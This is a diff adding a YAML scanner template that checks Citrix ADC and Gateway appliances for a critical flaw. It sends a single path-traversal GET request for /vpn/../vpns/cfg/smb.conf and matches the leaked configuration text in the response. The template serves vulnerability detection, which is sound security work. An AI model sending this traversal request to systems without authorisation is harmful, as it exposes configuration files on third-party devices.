@@ -1,0 +1,16 @@
+id: poc-yaml-citrix-adc-gateway-rce
+info:
+  name: Citrix ADC and Gateway 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Citrix
+  osprey-id: vb_2020_0003
+requests:
+- method: GET
+  path: /vpn/../vpns/cfg/smb.conf
+  expression: 'contains(body, "encrypt passwords =") && contains(body, "[global]")
+
+    '
+variables: {}
+transport: http
